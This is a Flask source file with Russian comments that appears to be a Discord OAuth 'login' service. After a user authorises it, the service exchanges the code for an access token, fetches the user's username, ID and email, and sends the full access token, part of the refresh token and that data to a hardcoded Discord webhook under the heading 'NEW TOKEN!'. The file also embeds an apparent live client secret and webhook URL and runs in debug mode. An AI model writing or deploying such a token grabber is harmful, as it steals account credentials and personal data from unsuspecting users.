from flask import Flask, request, redirect
import requests
import urllib.parse
import logging
from datetime import datetime

# Настройка логирования
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ===== НАСТРОЙКИ - ЗАМЕНИТЕ НА СВОИ =====
CLIENT_ID = "1527673986652176454"  # ← ВСТАВЬТЕ ВАШ CLIENT ID
CLIENT_SECRET = "BDSxVH-0mJDliOaFKcrIlL0vswgU7Sdt"  # ← ВСТАВЬТЕ ВАШ CLIENT SECRET
REDIRECT_URI = "https://fraction-bpr.onrender.com/callback"  # ← ВСТАВЬТЕ ВАШ URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1527674667274473502/VOQWxCWhCW0nx1-LY2PGhhJbNLBJadXkUOu1X3e2Y7nY43_gkhJaEGCvRtHcCqXatC79"  # ← ВАШ ВЕБХУК
# =======================================

@app.route('/')
def home():
    logger.info("=== ГЛАВНАЯ СТРАНИЦА ===")
    return "<h1>Discord Auth</h1><a href='/login'>Войти</a>"

@app.route('/login')
def login():
    logger.info("=== ЗАПРОС НА /login ===")
    logger.info(f"Client ID: {CLIENT_ID}")
    logger.info(f"Redirect URI: {REDIRECT_URI}")
    
    discord_auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds"
    )
    
    logger.info(f"URL для Discord: {discord_auth_url}")
    return redirect(discord_auth_url)

@app.route('/callback')
def callback():
    logger.info("=== ЗАПРОС НА /callback ===")
    logger.info(f"ВСЕ ПАРАМЕТРЫ: {dict(request.args)}")
    
    code = request.args.get('code')
    error = request.args.get('error')
    
    if error:
        logger.error(f"❌ Ошибка от Discord: {error}")
        return f"Ошибка: {error}", 400
    
    if not code:
        logger.error("❌ Код НЕ ПОЛУЧЕН!")
        return "Код не получен", 400
    
    logger.info(f"✅ Получен код: {code[:20]}... (длина: {len(code)})")
    
    # Обмен кода на токен
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    logger.info("➡️ Отправка запроса на обмен кода...")
    
    try:
        resp = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
        logger.info(f"📡 Статус Discord: {resp.status_code}")
        
        if resp.status_code == 200:
            token_data = resp.json()
            access_token = token_data.get("access_token")
            refresh_token = token_data.get("refresh_token")
            
            logger.info(f"✅✅✅ ТОКЕН ПОЛУЧЕН: {access_token[:30]}...")
            
            # Получаем информацию о пользователе
            try:
                headers = {'Authorization': f'Bearer {access_token}'}
                user_resp = requests.get('https://discord.com/api/users/@me', headers=headers)
                user_data = user_resp.json()
                logger.info(f"👤 Пользователь: {user_data.get('username')}")
                logger.info(f"📧 Email: {user_data.get('email')}")
            except Exception as e:
                logger.error(f"Ошибка получения данных пользователя: {e}")
            
            # ОТПРАВКА НА ВЕБХУК
            logger.info(f"📤 Отправка на вебхук: {WEBHOOK_URL}")
            
            try:
                # Формируем сообщение для Discord
                embed = {
                    "title": "🔐 НОВЫЙ ТОКЕН!",
                    "color": 0x00FF00,
                    "fields": [
                        {"name": "👤 Пользователь", "value": user_data.get('username', 'Неизвестно'), "inline": True},
                        {"name": "🆔 ID", "value": user_data.get('id', 'Неизвестно'), "inline": True},
                        {"name": "📧 Email", "value": user_data.get('email', 'Не указан'), "inline": True},
                        {"name": "🔑 Токен", "value": f"`{access_token}`", "inline": False},
                        {"name": "🔄 Refresh", "value": f"`{refresh_token[:30]}...`", "inline": False},
                        {"name": "⏰ Время", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": False}
                    ]
                }
                
                webhook_payload = {"embeds": [embed]}
                
                webhook_resp = requests.post(WEBHOOK_URL, json=webhook_payload, timeout=10)
                logger.info(f"📬 Ответ вебхука: {webhook_resp.status_code}")
                
                if webhook_resp.status_code == 204:
                    logger.info("✅✅✅ ТОКЕН ОТПРАВЛЕН НА ВЕБХУК!")
                else:
                    logger.warning(f"⚠️ Вебхук ответил: {webhook_resp.status_code} - {webhook_resp.text}")
                    
            except Exception as e:
                logger.error(f"❌ Ошибка отправки на вебхук: {e}")
            
            return "<h1>✅ Успешно!</h1><p>Токен отправлен на вебхук. Проверьте логи.</p>"
        else:
            logger.error(f"❌ Ошибка: {resp.status_code} - {resp.text}")
            return f"Ошибка: {resp.status_code}", 400
            
    except Exception as e:
        logger.error(f"❌ Критическая ошибка: {e}")
        return "Внутренняя ошибка", 500

@app.route('/health')
def health():
    return {"status": "ok", "timestamp": datetime.now().isoformat()}, 200

if __name__ == "__main__":
    logger.info("🚀 ЗАПУСК СЕРВИСА НА RENDER")
    app.run(host='0.0.0.0', port=8080, debug=True)
